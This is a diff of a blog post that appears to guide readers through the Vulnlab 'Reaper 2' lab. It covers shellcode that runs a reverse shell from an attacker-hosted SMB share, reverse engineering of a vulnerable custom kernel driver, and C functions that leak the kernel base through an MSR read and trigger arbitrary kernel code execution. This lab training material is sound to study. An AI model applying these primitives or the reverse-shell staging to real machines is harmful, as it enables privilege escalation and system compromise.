@@ -8,7 +8,7 @@ The [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2) for the lab gives s
 
 In this post I'm going to do something a little different. I am not going to post any full exploit code, and I am not going to write about the way I defeated the lab. I am going to write about how I would take on the lab now I know everything I have learned. So, this isn't going to be a walthrough you can follow, copy and paste a few things and beat the lab. It will act as a guide on how you can approach the lab, and write your own exploits to get `SYSTEM` access to **Reaper 2**.
 
-I will be showing how this can all be done **without** using the clues given in in the [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2). Let's go!
+I will be showing how this can all be done **without** using the clues given in in the [wiki](https://wiki.vulnlab.com/guidance/insane/reaper2). I won't be going in to great detail, for example how to attach a kernel debugger. The intention is that you can use this walkthrough as a guide when you get stuck. Let's go!
 
 ## Initial Access
 
@@ -179,7 +179,7 @@ resolve_winexec:
     jmp 0x1c                        ; this is to defeat the JIT restrictions
 ```
 
-- Pushes a string on the stack. This is an SMB share on my Kali host, with a reverse shell executable.
+- Pushes a string on the stack. This is an **SMB** share on my Kali host, with a reverse shell executable.
 - Calls `WinExec` using 64-bit calling conventions.
 
 I set up a **SMB** share on my Kali host. I hosted a reverse shell and executed my final JavaScript exploit in the Reaper Calculator:
@@ -194,17 +194,273 @@ Microsoft Windows [Version 10.0.20348.2402]
 C:\Windows\system32>
 ```
 
-### Enumeration
+### Gathering Binaries
 
-Now we are on the device we should take a copy of the custom driver `Reaper2.sys` and `C:\Windows\System32\ntoskrnl.exe`. These can be copied to our **SMB** share on our Kali host.
+Now we are on the device we should take a copy of the custom driver `Reaper.sys` and `C:\Windows\System32\ntoskrnl.exe`. These can be copied to our **SMB** share on our Kali host.
+
+We need the `Reaper.sys` file because it is a custom driver which we need to exploit to escalate our privileges and we need `ntoskrnl.exe` to find ROP gadgets to build a ROP chain.
 
 ## Privilege Escalation
 
-### Enumeration
+**Note:** Our reverse shell from initial access is running at **Low Integrity**.
 
-### Custom Driver
+### Reverse Engineering
+
+Our first step for privilege escalation is to reverse engineer the driver binary. We can load this in to **IDA Free**. We need to find the following:
+
+- Symlink in order to communicate with the driver from user mode.
+- Dispatch routine(s) to discover:
+  - I/O Control Numbers to send data to the driver.
+  - Possible vulnerailities.
+ 
+Using **WinDbg** whilst debugging a target running the custom driver we can find the **dispatch routines** very easily:
+
+```
+1: kd> !drvobj \Driver\Reaper 2
+Driver object (ffff828632002e30) is for:
+ \Driver\reaper
+
+DriverEntry:   fffff800161f5000	
+DriverStartIo: 00000000	
+DriverUnload:  fffff800161f1210	
+AddDevice:     00000000	
+
+Dispatch routines:
+[00] IRP_MJ_CREATE                      fffff800161f1000	+0xfffff800161f1000
+...
+[0e] IRP_MJ_DEVICE_CONTROL              fffff800161f1020	+0xfffff800161f1020
+```
+
+The **Symlink** can be found in the **DriverEntry** function, and then following the link to the called function:
+
+```
+// lines 29 and 30
+symLink = L"\\??\\Reaper";
+v3 = IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);
+```
+
+We can now reverse engineer the `IRP_MJ_DEVICE_CONTROL` function using **IDA**, at offset `0x1020`. I have included my efforts below, including comments and the renaming of variales:
+
+```c
+NTSTATUS __fastcall ReaperDeviceControl(__int64 DeviceObject, __int64 Irp)
+{
+  __int64 CurrentStackLocation; // r9
+  NTSTATUS status; // ebx
+  int IoControlCode; // eax
+  __int64 InputBuffer; // rsi
+  _DWORD *PoolWithTag; // rax
+  __int64 l_Irp; // [rsp+38h] [rbp+10h] BYREF
+
+
+  // Local copy of the IRP
+  l_Irp = Irp;
+
+  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IRP
+  CurrentStackLocation = *(_QWORD *)(Irp + 0xB8);
+
+  // STATUS_INVALID_DEVICE_REQUEST
+  status = 0xC0000010;
+
+  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
+  IoControlCode = *(_DWORD *)(CurrentStackLocation + 0x18);
+
+  // IOCTL 0x80002003 does not execute this block
+  if ( IoControlCode != 0x80002003 )
+  {
+    switch ( IoControlCode )
+    {
+      case 0x80002007:
+        ExFreePoolWithTag(g_allocated_user_data, 'paeR');
+MID_LABEL:
+        status = 0;
+        goto COMPLETE_REQUEST_LABEL;
+      case 0x8000200B:
+
+        // IOCTL 0x8000200B calls:
+        // PsLookupThreadById
+        // KeSetPriorityThread
+        // ObfDereferenceObject
+        status = PsLookupThreadByThreadId(*(unsigned int *)(g_allocated_user_data + 4), &l_Irp);
+        if ( status >= 0 )
+        {
+          KeSetPriorityThread(l_Irp, *(unsigned int *)(g_allocated_user_data + 8));
+          ObfDereferenceObject(l_Irp);
+
+          // Whatever we put in buffer+16 will be called
+          if ( *(_QWORD *)(g_allocated_user_data + 16) )
+            _guard_dispatch_icall_fptr();
+        }
+        goto COMPLETE_REQUEST_LABEL;
+      case 0x8000200F:
+
+        // Only IOCTL 0x8000200F calls __readmsr
+        **(_QWORD **)(g_allocated_user_data + 0x20) = __readmsr(*(_DWORD *)(g_allocated_user_data + 24));
+        break;
+      case 0x80002013:
+
+        // IOCTL 0x80002013 only seems to call _writemsr - see below
+        break;
+      default:
+        goto COMPLETE_REQUEST_LABEL;
+    }
+
+    // IOCTLs 0x8000200B, 0x8000200F, and 0x80002013 all call __writemsr 
+    __writemsr(*(_DWORD *)(g_allocated_user_data + 0x18), **(_QWORD **)(g_allocated_user_data + 0x20));
+  }
+
+  // IOCTL 0x80002003 rejoins here
+
+  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
+  // if InputBuffer == 0, status = 0xC000000D (STATUS_INVALID_PARAMETER)
+  // otherwise status = 0xC0000010 (STATUS_INVALID_DEVICE_REQUEST)
+  InputBuffer = *(_QWORD *)(CurrentStackLocation + 0x20);
+  status = InputBuffer != 0 ? 0xC0000010 : 0xC000000D;
+
+  // https://www.vergiliusproject.com/kernels/x64/windows-10/20h2/_IO_STACK_LOCATION
+  // InputBufferLength is CurrentStackLocation + 0x10
+  // Checks that the InputBufferLength is greater than 39
+  if ( *(_DWORD *)(CurrentStackLocation + 0x10) < 40u )
+    status = 0xC0000023;                        // STATUS_BUFFER_TOO_SMALL
+
+  // Check MagicNumber
+  if ( *(_DWORD *)InputBuffer == 0x6A55CC9E )
+  {
+
+    // Using NonPagedPool
+    PoolWithTag = (_DWORD *)ExAllocatePoolWithTag(0LL, 40LL, 'paeR');
+    g_allocated_user_data = (__int64)PoolWithTag;
+
+    // Copies the InputBuffer into the Global Buffer
+    if ( PoolWithTag )
+    {
+
+      // typedef struct ReaperData {
+      //     DWORD Magic;            // userData + 0
+      //     DWORD ThreadId;         // userData + 4
+      //     DWORD Priority;         // userData + 8
+      //     DWORD Padding;          // userData + 12
+      //     QWORD unknown1;         // userData + 16
+      //     DWORD msrRegister;      // userData + 24
+      //     QWORD msrValue;         // userData + 32
+      // } ReaperData;
+      *PoolWithTag = *(_DWORD *)InputBuffer;    // +0x0 = MagicNumber
+      *(_DWORD *)(g_allocated_user_data + 8) = *(_DWORD *)(InputBuffer + 8);// ThreadPriority
+      *(_DWORD *)(g_allocated_user_data + 4) = *(_DWORD *)(InputBuffer + 4);// ThreadId
+      *(_QWORD *)(g_allocated_user_data + 16) = *(_QWORD *)(InputBuffer + 16);// cfgCheck?
+      *(_DWORD *)(g_allocated_user_data + 24) = *(_DWORD *)(InputBuffer + 24);// msrRegister
+      *(_QWORD *)(g_allocated_user_data + 32) = *(_QWORD *)(InputBuffer + 32);// msrValue
+      goto MID_LABEL;
+    }
+  }
+COMPLETE_REQUEST_LABEL:
+
+  // Irp->IoStatus.Status = status;
+  *(_DWORD *)(Irp + 48) = status;
+
+  // Irp->IoStatus.Information = 0;
+  *(_QWORD *)(Irp + 56) = 0LL;
+  IofCompleteRequest(Irp, 0LL);
+  return status;
+}
+```
+
+The interesting parts are:
+
+```c
+// lines 46 and 47
+// IOCTL 0x8000200B
+// Whatever we put in buffer+16 will be called
+if ( *(_QWORD *)(g_allocated_user_data + 16) )
+  _guard_dispatch_icall_fptr();
+...
+// line 53
+// Only IOCTL 0x8000200F calls __readmsr
+**(_QWORD **)(g_allocated_user_data + 0x20) = __readmsr(*(_DWORD *)(g_allocated_user_data + 24));        
+```
+
+Lines `46` and `47` allow us to execute code at an address we pass in our buffer at an offset of `16` bytes. This is good but the target Kernel is running **kASLR** and **DEP** so we need to run Kernel code and we need a Kernel address disclosure in order to do this.
+
+Line `53` allows us to read a model-specific register (MSR). The register `0xC0000082` is the `IA32_LSTAR` register and points to the **syscall** function, which is at an offset of Kernel base. Effectively if you can read this, then you can work out what the base address of the kernel is on your target OS:
+
+```
+1: kd> ?nt!KiSystemCall64Shadow - nt
+Evaluate expression: 11055488 = 00000000`00a8b180
+```
+
+**Note:** On the target you will need to find the offset of `KiSystemServiceHandler`. It is a pain, but it can be done.
 
 ### Kernel Base Address Disclosure Bug
+
+We can exploit the Kernel address disclosure bug using the following function:
+
+```c
+QWORD ReadMSR(HANDLE hDevice, DWORD msr)
+{
+    ReaperData userData;
+    QWORD outputOfMSR = 0x0;
+
+    userData.Magic = 0x6a55cc9e;
+    userData.ThreadId = GetCurrentThreadId();
+    userData.Priority = 0;
+    userData.Padding = 0x41414141;
+    userData.unknown1 = 0x0;
+    userData.msrRegister = msr;
+    userData.msrValue = (QWORD)&outputOfMSR;
+    memset(&userData.MaliciousBuffer, 0x41, 0x10);
+
+    unsigned char outputBuf[1024];
+    memset(outputBuf, 0, sizeof(outputBuf));
+    ULONG bytesRtn;
+
+    // allocate
+    BOOL result = DeviceIoControl(hDevice, IOCTL_ALLOCATE, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);
+
+    // read msr
+    memset(outputBuf, 0, sizeof(outputBuf));
+    result = DeviceIoControl(hDevice, IOCTL_READMSR, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);
+
+    // Free pool memory
+    memset(outputBuf, 0, sizeof(outputBuf));
+    result = DeviceIoControl(hDevice, IOCTL_FREE, (LPVOID)NULL, (DWORD)0, outputBuf, 1024, &bytesRtn, NULL);
+
+    return outputOfMSR;
+}
+```
+
+This gives us a Kernel base address with which to defeat **kASRL**. The execute bug is similar, although we use a different IOCTL and pass the address of the code we want to execute in the user buffer:
+
+```c
+void ExecuteGadget(HANDLE hDevice, QWORD address)
+{
+    ReaperData userData;
+
+    userData.Magic = 0x6a55cc9e;
+    userData.ThreadId = GetCurrentThreadId();
+    userData.Priority = 0;
+    userData.Padding = 0x41414141;
+    userData.unknown1 = address;
+    userData.msrRegister = 0x41414141;
+    userData.msrValue = 0x4242424242424242;
+    memset(&userData.MaliciousBuffer, 0x41, 0x10);
+
+    unsigned char outputBuf[1024];
+    memset(outputBuf, 0, sizeof(outputBuf));
+    ULONG bytesRtn;
+
+    // allocate
+    BOOL result = DeviceIoControl(hDevice, IOCTL_ALLOCATE, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);
+
+    // execute code
+    memset(outputBuf, 0, sizeof(outputBuf));
+    result = DeviceIoControl(hDevice, IOCTL_EXECUTE_GADGET, (LPVOID)&userData, (DWORD)sizeof(struct ReaperData), outputBuf, 1024, &bytesRtn, NULL);
+
+    // Free pool memory
+    memset(outputBuf, 0, sizeof(outputBuf));
+    result = DeviceIoControl(hDevice, IOCTL_FREE, (LPVOID)NULL, (DWORD)0, outputBuf, 1024, &bytesRtn, NULL);
+}
+```
+
+
 
 ### Arbitrary Code Execution Bug
 
